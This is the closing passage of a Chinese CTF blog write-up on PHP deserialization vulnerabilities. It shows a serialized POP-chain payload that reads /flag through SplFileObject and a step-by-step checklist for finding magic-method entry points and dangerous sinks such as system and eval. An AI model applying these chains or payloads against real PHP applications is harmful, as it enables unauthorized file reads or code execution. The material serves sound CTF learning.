+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SERIALIZED:</span><br><span class="line">O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;O:5:&quot;begin&quot;:2:&#123;s:4:&quot;var1&quot;;N;s:4:&quot;var2&quot;;O:5:&quot;flaag&quot;:2:&#123;s:5:&quot;var10&quot;;O:6:&quot;eenndd&quot;:1:&#123;s:13:&quot;SplFileObject&quot;;s:5:&quot;/flag&quot;;&#125;s:5:&quot;var11&quot;;s:8:&quot;sWiJgunG&quot;;&#125;&#125;s:4:&quot;var2&quot;;N;&#125;</span><br><span class="line"></span><br><span class="line">URLENCODED:</span><br><span class="line">O%3A5%3A%22begin%22%3A2%3A%7Bs%3A4%3A%22var1%22%3BO%3A5%3A%22begin%22...</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="通用解题（）"><a href="#通用解题（）" class="headerlink" title="通用解题（）"></a>通用解题（）</h2><ol>
+<li><code>grep</code> 全部 <code>function __</code>，把每个魔术方法抄出来，标上”触发条件”</li>
+<li>找入口：<code>__destruct</code> &#x2F; <code>__wakeup</code> &#x2F; <code>__toString</code>（能由”外部对象当字符串用”触发）</li>
+<li>找终点：<code>system</code> &#x2F; <code>exec</code> &#x2F; <code>eval</code> &#x2F; <code>include</code> &#x2F; <code>file_get_contents</code> &#x2F; <code>fopen</code> &#x2F; <code>unserialize</code> &#x2F; <code>new</code></li>
+<li>每看一处 <code>$this-&gt;x</code>，问一句：”这行是把 x 当字符串、当函数、当属性、还是当类名用的？”——这一行就是下一跳</li>
+<li><code>new $var(...)</code>、<code>array_walk($this,...)</code>、<code>call_user_func($this-&gt;x)</code>、<code>$$var</code> 都是<strong>动态调用</strong>，优先怀疑</li>
+<li>用 PHP 生成 payload（<code>serialize()</code> + <code>urlencode()</code>），不手写长度</li>
+<li>先在本机同版本 PHP 上验证（<code>php -r</code> 或 <code>php -S</code>），再打靶场</li>
+<li>遇到 <code>==</code> 闸门先算 PHP 版本；<code>md5(md5()) == 数字</code>、<code>&quot;0e...&quot; == &quot;0e...&quot;</code> 都是松散比较的经典坑</li>
+</ol>
+<hr>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2026/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B8%8Eezpop-Writeup/" data-id="cmwc2jupo0000h0pf2ozg5pwe" data-title="PHP反序列化漏洞" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2026/10/14/moectf%E5%A4%8D%E7%9B%98/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">moectf复盘</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/">CTF</a><ul class="category-list-child"><li class="category-list-item"><a class="category-list-link" href="/categories/CTF/Web/">Web</a></li></ul></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Flask/" rel="tag">Flask</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Jinja2/" rel="tag">Jinja2</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSRF/" rel="tag">SSRF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/SSTI/" rel="tag">SSTI</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Session%E4%BC%AA%E9%80%A0/" rel="tag">Session伪造</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag">Web安全</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">php反序列化</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%A4%8D%E7%9B%98/" rel="tag">复盘</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Flask/" style="font-size: 10px;">Flask</a> <a href="/tags/Jinja2/" style="font-size: 10px;">Jinja2</a> <a href="/tags/SSRF/" style="font-size: 10px;">SSRF</a> <a href="/tags/SSTI/" style="font-size: 10px;">SSTI</a> <a href="/tags/Session%E4%BC%AA%E9%80%A0/" style="font-size: 10px;">Session伪造</a> <a href="/tags/Web%E5%AE%89%E5%85%A8/" style="font-size: 20px;">Web安全</a> <a href="/tags/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 10px;">php反序列化</a> <a href="/tags/%E5%A4%8D%E7%9B%98/" style="font-size: 10px;">复盘</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/11/">November 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/10/">October 2026</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/09/">September 2026</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/11/09/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E4%B8%8Eezpop-Writeup/">PHP反序列化漏洞</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/14/moectf%E5%A4%8D%E7%9B%98/">moectf复盘</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">关于渗透测试</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/13/%E5%85%B3%E4%BA%8E%E5%AF%86%E7%A0%81%E5%AD%A6/">关于密码学</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/12/moectf-ssti-writeup/">(no title)</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      
+      &copy; 2026 John Doe<br>
+      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+
+<script src="/js/jquery-3.6.4.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+
+  </div>
+</body>
+</html>
